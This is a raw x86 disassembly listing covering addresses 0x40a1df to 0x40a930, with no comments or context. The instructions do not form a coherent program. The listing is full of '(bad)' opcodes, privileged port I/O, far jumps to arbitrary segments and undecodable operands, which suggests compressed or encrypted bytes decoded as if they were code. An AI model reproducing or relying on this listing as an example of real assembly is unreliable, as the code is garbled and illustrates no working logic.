  40a1df:	adc    dh,BYTE PTR [edx]
  40a1e1:	lahf   
  40a1e2:	adc    al,0xbe
  40a1e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a1e5:	or     eax,DWORD PTR [ebx]
  40a1e7:	std    
  40a1e8:	sti    
  40a1e9:	sar    BYTE PTR [esi],1
  40a1eb:	cld    
  40a1ec:	into   
  40a1ed:	sub    cl,BYTE PTR [esp+ebx*2]
  40a1f0:	sub    ch,al
  40a1f2:	xor    bh,al
  40a1f4:	bound  esp,QWORD PTR [ecx-0x67]
  40a1f7:	or     al,0xc4
  40a1f9:	shl    DWORD PTR [ebp-0x32],0xe0
  40a1fd:	lea    ebx,[esi+ebp*8-0x7cb241ac]
  40a204:	inc    ebp
  40a205:	pop    ss
  40a206:	lock push edx
  40a208:	add    al,0xd
  40a20a:	ins    DWORD PTR es:[edi],dx
  40a20b:	or     al,0x9d
  40a20d:	scas   al,BYTE PTR es:[edi]
  40a20e:	mov    edi,0xdca67048
  40a213:	pop    edi
  40a214:	out    dx,al
  40a215:	(bad)  
  40a216:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a217:	test   eax,0x15fe44ed
  40a21c:	fs inc ecx
  40a21e:	pop    eax
  40a21f:	push   ebx
  40a220:	push   es
  40a221:	sbb    al,0x3e
  40a223:	outs   dx,BYTE PTR ds:[esi]
  40a224:	neg    DWORD PTR [edi-0x2169107]
  40a22a:	mov    ebx,0x7ab2805f
  40a22f:	mov    dl,0xdb
  40a231:	nop
  40a232:	fsubr  st,st(3)
  40a234:	cmp    esi,DWORD PTR [ebp-0x5c8485fb]
  40a23a:	pushf  
  40a23b:	dec    ebx
  40a23c:	in     al,dx
  40a23d:	add    BYTE PTR [ebx],al
  40a23f:	div    eax
  40a241:	xlat   BYTE PTR ds:[ebx]
  40a242:	sar    BYTE PTR [edi*8+0x181952c6],1
  40a249:	leave  
  40a24a:	inc    ebx
  40a24b:	outs   dx,DWORD PTR ds:[esi]
  40a24c:	mov    cl,al
  40a24e:	imul   eax,DWORD PTR [esi-0x17245770],0x2290f3b3
  40a258:	mov    bh,0x7c
  40a25a:	out    0xd4,al
  40a25c:	popa   
  40a25d:	jge    0x40a2a6
  40a25f:	shl    DWORD PTR [ebx+0xc7d12d5],0x13
  40a266:	add    al,0x8a
  40a268:	fld    TBYTE PTR [ebx-0x79d430c9]
  40a26e:	gs int 0x0
  40a271:	mov    ds:0x281e8f8,eax
  40a276:	inc    edi
  40a277:	loop   0x40a229
  40a279:	pop    ebp
  40a27a:	lods   al,BYTE PTR ds:[esi]
  40a27b:	test   BYTE PTR [edi-0x53df71ff],bl
  40a281:	ins    BYTE PTR es:[edi],dx
  40a282:	dec    esp
  40a283:	sub    eax,0x1c5978a7
  40a288:	or     al,0xb8
  40a28a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a28b:	sti    
  40a28c:	repnz sahf 
  40a28e:	xchg   esp,eax
  40a28f:	ret    
  40a290:	jbe    0x40a2b1
  40a292:	call   0xcbf5:0x9891c8d1
  40a299:	inc    edx
  40a29a:	or     DWORD PTR [eax],ebx
  40a29c:	ret    0xa85f
  40a29f:	dec    eax
  40a2a0:	dec    ebp
  40a2a1:	xor    edi,esp
  40a2a3:	jns    0x40a234
  40a2a5:	and    BYTE PTR [edi-0x39],al
  40a2a8:	jbe    0x4dbd66ad
  40a2ae:	or     al,0x39
  40a2b0:	mov    ebx,0x7c0bf62e
  40a2b5:	sub    esi,DWORD PTR [esi+0x7d]
  40a2b8:	or     dh,BYTE PTR [ecx*1+0x235e9475]
  40a2bf:	jecxz  0x40a2ea
  40a2c1:	je     0x40a250
  40a2c3:	ins    DWORD PTR es:[edi],dx
  40a2c4:	pop    eax
  40a2c5:	dec    edx
  40a2c6:	push   edi
  40a2c7:	test   eax,0x3d992381
  40a2cc:	loopne 0x40a297
  40a2ce:	imul   ebp,esi,0xffffff94
  40a2d1:	in     eax,0xbf
  40a2d3:	or     bl,BYTE PTR [ebp-0x39]
  40a2d6:	cli    
  40a2d7:	jb     0x40a29a
  40a2d9:	add    ah,dl
  40a2db:	cmc    
  40a2dc:	add    al,0x52
  40a2de:	inc    edi
  40a2df:	push   edi
  40a2e0:	loop   0x40a313
  40a2e2:	inc    BYTE PTR [ebp-0x72]
  40a2e5:	inc    edx
  40a2e6:	out    0x6,al
  40a2e8:	imul   ecx,DWORD PTR [edi],0xb4e5e537
  40a2ee:	call   0xc26b:0x572eae11
  40a2f5:	push   eax
  40a2f6:	xchg   edx,eax
  40a2f7:	adc    dl,BYTE PTR [esi+0x2b]
  40a2fa:	sub    esi,DWORD PTR [esi-0x7]
  40a2fd:	loop   0x40a2c6
  40a2ff:	sbb    esi,esp
  40a301:	nop
  40a302:	or     esp,DWORD PTR [ecx-0x1b]
  40a305:	cdq    
  40a306:	xlat   BYTE PTR ds:[ebx]
  40a307:	imul   eax,DWORD PTR [esp+edx*8],0xffffff93
  40a30b:	mov    esp,0x1441b0a2
  40a310:	cmp    BYTE PTR [edi+0xe],al
  40a313:	mov    ds:0xfe5a9a52,al
  40a318:	push   ebx
  40a319:	outs   dx,DWORD PTR ds:[esi]
  40a31a:	add    esp,DWORD PTR [esi+0xdf31f63]
  40a320:	arpl   bp,sp
  40a322:	push   esi
  40a323:	rol    DWORD PTR [esi+0x5b9a6371],0x85
  40a32a:	cs push edx
  40a32c:	add    DWORD PTR [edi+ecx*1-0x3d],edi
  40a330:	retf   
  40a331:	dec    ebx
  40a332:	lods   al,BYTE PTR ds:[esi]
  40a333:	inc    edx
  40a334:	(bad)  
  40a335:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a336:	(bad)  
  40a339:	cmp    BYTE PTR [ecx+0x28cb9509],cl
  40a33f:	pop    ebx
  40a340:	test   al,0x83
  40a342:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a343:	mov    ebx,0xf7c101a0
  40a348:	jnp    0x40a361
  40a34a:	or     DWORD PTR ds:[edi],esi
  40a34d:	add    ebp,edx
  40a34f:	enter  0xfbc6,0xad
  40a353:	sub    dh,0x56
  40a356:	sbb    ebx,DWORD PTR [esi-0x336b98a1]
  40a35c:	and    ebp,DWORD PTR [edx+eiz*1-0x536b0b79]
  40a363:	push   0xb63d0f2f
  40a368:	stos   BYTE PTR es:[edi],al
  40a369:	out    0xea,al
  40a36b:	mov    esp,DWORD PTR [ebp-0x30]
  40a36e:	imul   eax,ebp,0xfffffff0
  40a371:	inc    esi
  40a372:	and    edx,eax
  40a374:	ss sub eax,0xfc2f094e
  40a37a:	enter  0x4eac,0xa4
  40a37e:	repnz adc al,0x87
  40a381:	fsub   DWORD PTR [ebx]
  40a383:	push   es
  40a384:	jmp    0x950470cf
  40a389:	push   ss
  40a38a:	dec    ecx
  40a38b:	adc    bh,dh
  40a38d:	lods   eax,DWORD PTR ds:[esi]
  40a38e:	fcomi  st,st(5)
  40a390:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a391:	push   ebx
  40a392:	inc    esp
  40a393:	dec    ebp
  40a394:	ficomp DWORD PTR [ebp-0x52dfb791]
  40a39a:	inc    edx
  40a39b:	in     eax,0xfe
  40a39d:	jecxz  0x40a3c9
  40a39f:	jbe    0x40a3bd
  40a3a1:	mov    cl,0xf1
  40a3a3:	jno    0x40a3bc
  40a3a5:	clc    
  40a3a6:	lods   eax,DWORD PTR ds:[esi]
  40a3a7:	push   ebp
  40a3a8:	leave  
  40a3a9:	in     al,dx
  40a3aa:	shl    BYTE PTR [edi],cl
  40a3ac:	in     eax,dx
  40a3ad:	lea    edi,[edx+eiz*4]
  40a3b0:	xor    BYTE PTR [edx-0x738f8ca4],cl
  40a3b6:	sbb    DWORD PTR [eax-0x55644633],edx
  40a3bc:	jmp    0xa972:0x7744c456
  40a3c3:	shl    dh,1
  40a3c5:	inc    esi
  40a3c6:	das    
  40a3c7:	add    bh,BYTE PTR [ebp+0x73]
  40a3ca:	fild   WORD PTR [edx]
  40a3cc:	dec    eax
  40a3cd:	add    DWORD PTR [ebp+0x48776944],eax
  40a3d3:	jp     0x40a3e7
  40a3d5:	stos   BYTE PTR es:[edi],al
  40a3d6:	mov    dh,0xf9
  40a3d8:	lahf   
  40a3d9:	and    edx,edi
  40a3db:	add    DWORD PTR [ecx-0x50dc7185],ecx
  40a3e1:	inc    ebx
  40a3e2:	cmp    bl,BYTE PTR [edi-0x66]
  40a3e5:	jno    0x40a404
  40a3e7:	(bad)  
  40a3e8:	adc    DWORD PTR [esi-0x6f],esi
  40a3eb:	push   ecx
  40a3ec:	lods   al,BYTE PTR ds:[esi]
  40a3ed:	jne    0x40a403
  40a3ef:	cmp    esp,DWORD PTR [edi+0x1]
  40a3f2:	jbe    0x40a41e
  40a3f4:	jg     0x40a3fd
  40a3f6:	or     DWORD PTR [ecx+0x1d],ecx
  40a3f9:	fdiv   st(5),st
  40a3fb:	in     eax,dx
  40a3fc:	xor    DWORD PTR [edx+ebx*8-0x40],edx
  40a400:	cmc    
  40a401:	xor    esp,esi
  40a403:	ins    BYTE PTR es:[edi],dx
  40a404:	arpl   WORD PTR [eax],si
  40a406:	inc    BYTE PTR [edi+0x48]
  40a409:	dec    ebp
  40a40a:	mov    ds:0xe81c25d,eax
  40a40f:	mov    ebp,0xd390f288
  40a414:	mov    dh,0xe6
  40a416:	inc    ebx
  40a417:	add    BYTE PTR [edx],0x34
  40a41a:	xchg   ebp,eax
  40a41b:	cmp    al,0x7b
  40a41d:	dec    ebx
  40a41e:	dec    sp
  40a420:	mov    ch,0xdf
  40a422:	xchg   DWORD PTR [eax],esi
  40a424:	loope  0x40a3b0
  40a426:	loop   0x40a3f7
  40a428:	shr    DWORD PTR [ecx],cl
  40a42a:	mov    ds:0x1bce46d,al
  40a42f:	sti    
  40a430:	test   DWORD PTR [esi-0x4],esp
  40a433:	neg    DWORD PTR [esi]
  40a435:	nop
  40a436:	call   0x4ae7a8f9
  40a43b:	ret    0x248c
  40a43e:	daa    
  40a43f:	pop    ds
  40a440:	push   0x76
  40a442:	push   0xb4cc091f
  40a447:	mov    esi,gs
  40a449:	out    dx,al
  40a44a:	(bad)  
  40a44b:	or     al,0x1f
  40a44d:	push   edi
  40a44e:	fcmovnbe st,st(4)
  40a450:	mov    bh,0x2d
  40a452:	or     al,0x20
  40a454:	mov    ds:0x5a375ad0,al
  40a459:	inc    ebp
  40a45a:	cmp    BYTE PTR [eax-0x45dcdb00],0xc4
  40a461:	int    0x53
  40a463:	jo     0x40a4b5
  40a465:	jbe    0x40a411
  40a467:	mov    edx,0xa2d68539
  40a46c:	push   ss
  40a46d:	cmp    al,BYTE PTR [esi+ebx*1-0x49]
  40a471:	fadd   DWORD PTR [eax+0x4b752c40]
  40a477:	push   cs
  40a478:	rcl    esp,cl
  40a47a:	lea    edx,[ecx+ecx*4]
  40a47d:	jne    0x40a416
  40a47f:	or     eax,0xffffffac
  40a482:	out    dx,eax
  40a483:	mov    eax,0x794345ad
  40a488:	rol    BYTE PTR [ebx-0x2007023a],0x17
  40a48f:	cwde   
  40a490:	fcom   QWORD PTR [ecx+0x18]
  40a493:	xchg   edi,eax
  40a494:	xor    BYTE PTR [ebp+0x20],ah
  40a497:	push   eax
  40a498:	inc    esi
  40a499:	dec    ebx
  40a49a:	mov    edi,fs
  40a49c:	cld    
  40a49d:	das    
  40a49e:	xor    al,0xde
  40a4a0:	pop    esi
  40a4a1:	test   edx,0xe7b39251
  40a4a7:	out    0x2d,al
  40a4a9:	push   cs
  40a4aa:	push   esp
  40a4ab:	pop    ss
  40a4ac:	xor    DWORD PTR [edi+0x139a6ca4],ebp
  40a4b2:	ss add eax,0x6564732d
  40a4b8:	pop    ecx
  40a4b9:	test   edi,esi
  40a4bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a4bc:	push   0x578c9498
  40a4c1:	push   edi
  40a4c2:	outs   dx,BYTE PTR ds:[esi]
  40a4c3:	mov    DWORD PTR [esi],ebx
  40a4c5:	push   ds
  40a4c6:	test   BYTE PTR [edi+0x44ff801a],bl
  40a4cc:	mov    ds:0x6203f3d6,al
  40a4d1:	pop    ebx
  40a4d2:	sub    BYTE PTR [edx+0x6d],bl
  40a4d5:	xlat   BYTE PTR ds:[ebx]
  40a4d6:	(bad)  
  40a4d7:	xchg   edi,eax
  40a4d8:	mov    cl,BYTE PTR [esi+0x6a17efc]
  40a4de:	fst    DWORD PTR [edi-0x5c]
  40a4e1:	out    dx,al
  40a4e2:	scas   eax,DWORD PTR es:[edi]
  40a4e3:	dec    ebp
  40a4e4:	ds xchg edx,eax
  40a4e6:	bound  esi,QWORD PTR [edi-0x36]
  40a4e9:	cmp    esi,ebx
  40a4eb:	adc    al,0x91
  40a4ed:	(bad)  
  40a4ef:	xchg   esp,eax
  40a4f0:	mov    esi,0x1dd48c0b
  40a4f5:	call   0xcff5:0x8e1e33aa
  40a4fc:	xchg   edi,eax
  40a4fd:	pop    ecx
  40a4fe:	xlat   BYTE PTR ds:[ebx]
  40a4ff:	adc    esp,DWORD PTR [eax+0x33d09aea]
  40a505:	or     BYTE PTR [edx],0x7f
  40a508:	mov    ah,0xbf
  40a50a:	xchg   esp,eax
  40a50b:	and    ah,BYTE PTR [ebx-0x72]
  40a50e:	sbb    BYTE PTR [edx+0x51],0xcd
  40a512:	les    esi,FWORD PTR [ecx-0x45]
  40a515:	and    eax,DWORD PTR [ecx+0xeaa9687]
  40a51b:	je     0x40a57d
  40a51d:	dec    edi
  40a51e:	push   ebp
  40a51f:	shl    BYTE PTR ds:0x5992e02,cl
  40a526:	rcl    ch,0x49
  40a529:	mov    gs:0x918df66d,eax
  40a52f:	out    dx,eax
  40a530:	test   eax,0x6c8defd6
  40a535:	jmp    0x40a4b7
  40a537:	ja     0x40a5b1
  40a539:	jo     0x40a5b9
  40a53b:	int3   
  40a53c:	pop    ds
  40a53d:	add    DWORD PTR ds:[edi+0x5971e738],edx
  40a544:	or     edx,DWORD PTR [edx+0x98b9d4b]
  40a54a:	cdq    
  40a54b:	push   edi
  40a54c:	cmp    BYTE PTR [ebp+0x19],dh
  40a54f:	(bad)  
  40a550:	stc    
  40a551:	fcom   DWORD PTR [esi-0x15]
  40a554:	or     ecx,ebp
  40a556:	ds nop
  40a558:	sub    eax,0x961c2122
  40a55d:	cli    
  40a55e:	das    
  40a55f:	fidivr DWORD PTR [edi]
  40a561:	cmp    bh,BYTE PTR [edx+0x2]
  40a564:	out    0x36,eax
  40a566:	test   al,0xc1
  40a568:	sub    al,0xb8
  40a56a:	shl    al,cl
  40a56c:	xchg   edi,eax
  40a56d:	push   cs
  40a56e:	xchg   BYTE PTR [eax],ch
  40a570:	inc    ecx
  40a571:	and    ecx,DWORD PTR [ecx-0x6fe9ef0c]
  40a577:	cmp    dh,ah
  40a579:	sti    
  40a57a:	push   ds
  40a57b:	shl    DWORD PTR [ecx],cl
  40a57d:	jl     0x40a568
  40a57f:	jne    0x40a533
  40a581:	jmp    0x94636be4
  40a586:	bound  ebp,QWORD PTR [ebx-0x4e]
  40a589:	stos   BYTE PTR es:[edi],al
  40a58a:	arpl   ax,dx
  40a58c:	(bad)  
  40a58e:	or     DWORD PTR ds:0x4acf9ca6,esi
  40a594:	or     al,0x42
  40a596:	jnp    0x40a5cb
  40a598:	cdq    
  40a599:	push   ebx
  40a59a:	mov    eax,0xcc10cef4
  40a59f:	xor    DWORD PTR [edx],0xc568a250
  40a5a5:	and    eax,0x64e92a9c
  40a5aa:	inc    ebp
  40a5ab:	rcr    BYTE PTR [esi-0x76676983],cl
  40a5b1:	outs   dx,DWORD PTR ds:[esi]
  40a5b2:	ja     0x40a5c0
  40a5b4:	add    DWORD PTR [edx+eax*4],edi
  40a5b7:	inc    edi
  40a5b8:	sub    al,0x8f
  40a5ba:	and    eax,0xcdf3aa7f
  40a5bf:	pop    edx
  40a5c0:	inc    esi
  40a5c1:	call   0x444efc20
  40a5c6:	or     DWORD PTR [edi],ebp
  40a5c8:	push   esi
  40a5c9:	push   ecx
  40a5ca:	ds nop
  40a5cc:	stos   BYTE PTR es:[edi],al
  40a5cd:	mov    dh,BYTE PTR [esi-0x5a8c1488]
  40a5d3:	push   0x377f2b2e
  40a5d8:	or     al,0x29
  40a5da:	iret   
  40a5db:	xchg   esi,eax
  40a5dc:	int    0xfc
  40a5de:	das    
  40a5df:	jbe    0x40a5c3
  40a5e1:	xor    esi,esi
  40a5e3:	out    0x9f,al
  40a5e5:	lods   eax,DWORD PTR ds:[esi]
  40a5e6:	out    dx,al
  40a5e7:	adc    eax,0x1990d33f
  40a5ec:	pop    ebp
  40a5ed:	loop   0x40a5f4
  40a5ef:	lds    ecx,FWORD PTR [edi]
  40a5f1:	gs out 0x9b,eax
  40a5f4:	adc    eax,0x93cd2fa
  40a5f9:	xchg   ebx,edx
  40a5fb:	sub    eax,0xb7f0521
  40a600:	mov    dl,0xeb
  40a602:	and    al,0x99
  40a604:	push   edx
  40a605:	or     esi,DWORD PTR [esi-0x605fd00e]
  40a60b:	push   0x86bc1f96
  40a610:	and    BYTE PTR [eax+ecx*8-0x267c842],ch
  40a617:	repz aas 
  40a619:	xchg   edx,eax
  40a61a:	fdivr  DWORD PTR [edi]
  40a61c:	cmp    ah,0x4f
  40a61f:	std    
  40a620:	mov    ecx,0x6effce4a
  40a625:	cdq    
  40a626:	pushf  
  40a627:	pop    edx
  40a628:	cwde   
  40a629:	xor    DWORD PTR [eax+0x5c],edx
  40a62c:	fldcw  WORD PTR [edx]
  40a62e:	daa    
  40a62f:	sub    esi,DWORD PTR [edi-0x23]
  40a632:	mov    eax,ds:0xc94ba40d
  40a637:	dec    edi
  40a638:	and    DWORD PTR [eax+0xb6137c0],0xffffffe9
  40a63f:	mov    eax,0x3bc25d5f
  40a644:	in     eax,dx
  40a645:	or     edi,DWORD PTR [edx+eiz*2-0x61]
  40a649:	fisttp WORD PTR [ebx-0xb4d75ff]
  40a64f:	xchg   esp,eax
  40a650:	mov    ds:0xc8b24b98,eax
  40a655:	mov    bh,0x58
  40a657:	loopne 0x40a698
  40a659:	xor    DWORD PTR [ebx],ebx
  40a65b:	pushf  
  40a65c:	fldcw  WORD PTR [esi]
  40a65e:	icebp  
  40a65f:	cmp    al,0xd1
  40a661:	mov    esp,?
  40a663:	sbb    DWORD PTR [edi+0x18966362],0xf320f29f
  40a66d:	mov    al,0xfb
  40a66f:	dec    edi
  40a670:	jb     0x40a6da
  40a672:	mov    bl,0xc2
  40a674:	mov    ebx,0x7f011082
  40a679:	sahf   
  40a67a:	or     eax,esp
  40a67c:	pop    ecx
  40a67d:	sbb    BYTE PTR ds:0x84c86368,bl
  40a683:	mov    es,WORD PTR [ecx]
  40a685:	jnp    0x40a67d
  40a687:	adc    BYTE PTR [eax+eax*4-0x3],cl
  40a68b:	xchg   ecx,eax
  40a68c:	jo     0x40a6cb
  40a68e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a68f:	adc    BYTE PTR [edx+0x4452b6cb],ch
  40a695:	fucomp st(2)
  40a697:	sub    edi,ebp
  40a699:	push   es
  40a69a:	mov    DWORD PTR [esi+0x1fe19bc1],esi
  40a6a0:	fdiv   st(4),st
  40a6a2:	and    al,dh
  40a6a4:	in     al,dx
  40a6a5:	cdq    
  40a6a6:	js     0x40a68f
  40a6a8:	repz sti 
  40a6aa:	push   edx
  40a6ab:	sub    BYTE PTR [edi],bh
  40a6ad:	imul   edx,DWORD PTR [ecx],0xdc782c66
  40a6b3:	ret    
  40a6b4:	mov    ?,WORD PTR [eax+eax*8-0x11]
  40a6b8:	sar    esp,0xbe
  40a6bb:	mov    ah,BYTE PTR [ebx]
  40a6bd:	popa   
  40a6be:	cmp    DWORD PTR [ebx],ebp
  40a6c0:	xchg   esi,eax
  40a6c1:	jp     0x40a68b
  40a6c3:	adc    al,0xa8
  40a6c5:	sbb    al,0xde
  40a6c7:	ins    DWORD PTR es:[edi],dx
  40a6c8:	pushf  
  40a6c9:	fdiv   st,st(4)
  40a6cb:	outs   dx,DWORD PTR ds:[esi]
  40a6cc:	dec    ecx
  40a6cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a6ce:	xchg   edx,eax
  40a6cf:	loope  0x40a689
  40a6d1:	or     eax,0x6345e0c
  40a6d6:	mov    al,ds:0xb81700ce
  40a6db:	push   ss
  40a6dc:	add    cl,0x47
  40a6df:	test   esp,eax
  40a6e1:	pop    ds
  40a6e2:	lods   al,BYTE PTR ds:[esi]
  40a6e3:	adc    al,0xaf
  40a6e5:	jbe    0x40a74c
  40a6e7:	push   ss
  40a6e8:	loopne 0x40a768
  40a6ea:	jmp    0x2a5f:0x2dfb199a
  40a6f1:	addr16 psrld mm6,mm3
  40a6f5:	or     dl,BYTE PTR [eax-0x48259295]
  40a6fb:	out    0xed,al
  40a6fd:	out    dx,al
  40a6fe:	jle    0x40a718
  40a700:	jg     0x40a71e
  40a702:	test   al,0xac
  40a704:	push   ds
  40a705:	out    dx,eax
  40a706:	pop    edi
  40a707:	retf   0x9c38
  40a70a:	jmp    0x3ee75b93
  40a70f:	pop    ebx
  40a710:	cld    
  40a711:	cmp    BYTE PTR [ecx],al
  40a713:	pop    edi
  40a714:	ror    BYTE PTR [edi],1
  40a716:	xchg   esp,eax
  40a717:	xchg   ah,ch
  40a719:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a71b:	nop
  40a71c:	push   ecx
  40a71d:	inc    eax
  40a71e:	sub    eax,0x88305699
  40a723:	inc    esi
  40a724:	les    esp,FWORD PTR [edi*2+0x6167b70d]
  40a72b:	adc    DWORD PTR [eax+0x2c],ebp
  40a72e:	mov    edx,0xd9c9d9fd
  40a733:	xchg   cl,bh
  40a735:	add    al,0xc6
  40a737:	cdq    
  40a738:	inc    edx
  40a739:	sbb    eax,0x5b48facc
  40a73e:	test   BYTE PTR [eax],0xbd
  40a741:	mov    ah,0x50
  40a743:	mov    ch,BYTE PTR [ebp-0x59426d7a]
  40a749:	xor    esi,ebp
  40a74b:	cmp    BYTE PTR [ebp+0x4ce19bf9],cl
  40a751:	rol    BYTE PTR [ebx-0x4d],cl
  40a754:	into   
  40a755:	iret   
  40a756:	jp     0x40a71b
  40a758:	(bad)  
  40a759:	jp     0x40a6df
  40a75b:	add    ax,0xd38a
  40a75f:	cmp    DWORD PTR es:[eax+0x4f],ebx
  40a763:	test   al,0x69
  40a765:	cli    
  40a766:	add    edi,ebp
  40a768:	repnz cld 
  40a76a:	or     ch,bl
  40a76c:	xchg   ecx,eax
  40a76d:	das    
  40a76e:	adc    BYTE PTR ss:[edx-0x6e4f10b9],ch
  40a775:	jo     0x40a75f
  40a777:	std    
  40a778:	xchg   edx,eax
  40a779:	or     DWORD PTR [esi+ebp*1+0x77],esp
  40a77d:	xchg   cl,al
  40a77f:	int    0xc
  40a781:	mov    ebp,DWORD PTR [edi+0x1c]
  40a784:	add    al,0x96
  40a786:	mov    ebx,0xbd1b2e31
  40a78b:	ret    0x61c0
  40a78e:	test   BYTE PTR [edx+0x7e70a28f],ah
  40a794:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a795:	and    eax,0x98ddca14
  40a79a:	mov    DWORD PTR ds:0x3795fbd9,ebp
  40a7a0:	push   es
  40a7a1:	in     eax,0xc2
  40a7a3:	or     BYTE PTR [esi+0x79],ah
  40a7a6:	pop    ds
  40a7a7:	pop    ds
  40a7a8:	push   ecx
  40a7a9:	sbb    eax,0x3eb7d61e
  40a7ae:	or     BYTE PTR [ebx+ebx*2-0x72e3225],dl
  40a7b5:	imul   ebx,DWORD PTR [esp+edi*8+0x4257f634],0xdc751b3f
  40a7c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a7c1:	pop    ss
  40a7c2:	and    al,0xf4
  40a7c4:	mov    ebp,0x9a5ccff
  40a7c9:	pushf  
  40a7ca:	xor    esp,DWORD PTR [edx]
  40a7cc:	add    BYTE PTR [esi+ebp*8-0x3b],cl
  40a7d0:	pop    ebp
  40a7d1:	cmp    al,0x93
  40a7d3:	cmp    eax,0x18fc8d47
  40a7d8:	loop   0x40a7eb
  40a7da:	or     DWORD PTR [edi],esi
  40a7dc:	cdq    
  40a7dd:	ins    BYTE PTR es:[edi],dx
  40a7de:	push   0xa07dfd76
  40a7e3:	rcl    DWORD PTR [ebx-0x5b7c960e],1
  40a7e9:	sub    edi,DWORD PTR [ebx]
  40a7eb:	add    dl,bl
  40a7ed:	(bad)  
  40a7f0:	inc    eax
  40a7f1:	jp     0x40a7ab
  40a7f3:	xlat   BYTE PTR ds:[ebx]
  40a7f4:	mov    esp,0x435a9904
  40a7f9:	add    DWORD PTR [eax],edx
  40a7fb:	dec    edi
  40a7fc:	inc    eax
  40a7fd:	ins    DWORD PTR es:[edi],dx
  40a7fe:	sbb    BYTE PTR [eax],ah
  40a800:	(bad)  
  40a801:	out    0x87,eax
  40a803:	aaa    
  40a804:	pop    edx
  40a805:	and    ebp,DWORD PTR [ebx+0x40]
  40a808:	rol    DWORD PTR [edi+0x3ac4db3a],cl
  40a80e:	add    ch,BYTE PTR [edi+0x23]
  40a811:	xchg   esi,eax
  40a812:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a813:	mov    ebp,0xc9c9f05a
  40a818:	les    ebp,FWORD PTR [ebp+ecx*2-0xd]
  40a81c:	cmp    ch,bl
  40a81e:	cs xchg bp,ax
  40a821:	adc    eax,0xb657d5a2
  40a826:	push   esp
  40a827:	cmc    
  40a828:	xor    al,0x2d
  40a82a:	sbb    bh,BYTE PTR [edx+0x421fdb83]
  40a830:	jo     0x40a82e
  40a832:	ds and bl,ah
  40a835:	repnz (bad) 
  40a837:	out    dx,eax
  40a838:	sbb    DWORD PTR [eax+0xd73a6f4],esi
  40a83e:	jmp    0xb236:0x466af4f7
  40a845:	mov    ebx,0xd0a9eb67
  40a84a:	push   ds
  40a84b:	inc    ebx
  40a84c:	adc    DWORD PTR [ebx],esi
  40a84e:	mov    edx,0x90fbdfa5
  40a853:	in     eax,0x40
  40a855:	aad    0x1a
  40a857:	jge    0x40a80c
  40a859:	jne    0x40a8c3
  40a85b:	inc    ebx
  40a85c:	outs   dx,DWORD PTR ds:[esi]
  40a85d:	mov    edi,0x310cfcbd
  40a862:	and    eax,0xb2fa6d2
  40a867:	pop    es
  40a868:	jp     0x40a821
  40a86a:	xor    DWORD PTR [edx-0x527cc64],esp
  40a870:	ret    0xe76a
  40a873:	push   0x28fdb921
  40a878:	inc    ebx
  40a879:	call   0xa6699e41
  40a87e:	(bad)  
  40a87f:	push   esp
  40a880:	mov    ds:0x99e0d340,al
  40a885:	rcr    eax,0xf7
  40a888:	shl    BYTE PTR [edx-0x17],0x5d
  40a88c:	ds (bad) 
  40a88e:	cld    
  40a88f:	out    0x84,al
  40a891:	mov    edx,0x4140a76f
  40a896:	repz jp 0x40a885
  40a899:	dec    ebx
  40a89a:	ja     0x40a87a
  40a89c:	pop    ebp
  40a89d:	stos   BYTE PTR es:[edi],al
  40a89e:	(bad)  
  40a89f:	jb     0x40a91f
  40a8a1:	ret    
  40a8a2:	add    ecx,esi
  40a8a4:	out    0x11,al
  40a8a6:	bound  ebx,QWORD PTR [esi-0x3e]
  40a8a9:	inc    ebp
  40a8aa:	fsubr  st(0),st
  40a8ac:	loopne 0x40a845
  40a8ae:	ins    DWORD PTR es:[edi],dx
  40a8af:	add    BYTE PTR [ecx],ah
  40a8b1:	mov    ch,BYTE PTR [edi-0x52]
  40a8b4:	lea    ebp,[ecx]
  40a8b6:	xor    cl,bh
  40a8b8:	ins    DWORD PTR es:[edi],dx
  40a8b9:	and    dh,0x5b
  40a8bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a8bd:	push   ebp
  40a8be:	sbb    DWORD PTR [esi],esi
  40a8c0:	ds mov edx,0xf7e7a6d
  40a8c6:	cdq    
  40a8c7:	inc    ebx
  40a8c8:	add    eax,0x62bd1fe8
  40a8cd:	xchg   edi,esp
  40a8cf:	jno    0x40a8ed
  40a8d1:	push   eax
  40a8d2:	mov    al,0xd7
  40a8d4:	hlt    
  40a8d5:	add    DWORD PTR [ecx+edi*1],edx
  40a8d8:	sbb    eax,ebp
  40a8da:	mov    al,ds:0xab12a8fa
  40a8df:	push   cs
  40a8e0:	sub    dl,BYTE PTR [edx+0x13]
  40a8e3:	call   0x401bdc31
  40a8e8:	or     edx,DWORD PTR [ebp+0x585320cc]
  40a8ee:	into   
  40a8ef:	inc    edx
  40a8f0:	cdq    
  40a8f1:	in     al,0x8c
  40a8f3:	jecxz  0x40a91b
  40a8f5:	mov    al,ds:0xff775fa2
  40a8fa:	fadd   DWORD PTR [edi]
  40a8fc:	pop    edx
  40a8fd:	sbb    eax,0xf6da5127
  40a902:	(bad)  
  40a903:	cmp    al,0x58
  40a905:	push   eax
  40a906:	(bad)  
  40a907:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a908:	mov    ds:0xc0d70979,al
  40a90d:	into   
  40a90e:	jae    0x40a93c
  40a910:	pop    ss
  40a911:	push   ss
  40a912:	mov    al,0xa9
  40a914:	fisttp DWORD PTR [edi+eiz*2]
  40a917:	repnz les ebp,FWORD PTR gs:[ebx-0x58]
  40a91c:	(bad)  
  40a91d:	lods   al,BYTE PTR ds:[esi]
  40a91e:	in     eax,dx
  40a91f:	sahf   
  40a920:	and    DWORD PTR ds:0xe7962061,ebp
  40a926:	mov    ah,0x5b
  40a928:	adc    esp,DWORD PTR [edx+0x387e9ee2]
  40a92e:	aam    0x94
  40a930:	sbb    BYTE PTR [ebp-0xe],al
